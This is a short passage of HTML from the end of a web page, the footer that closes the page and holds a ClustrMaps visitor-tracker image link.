    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>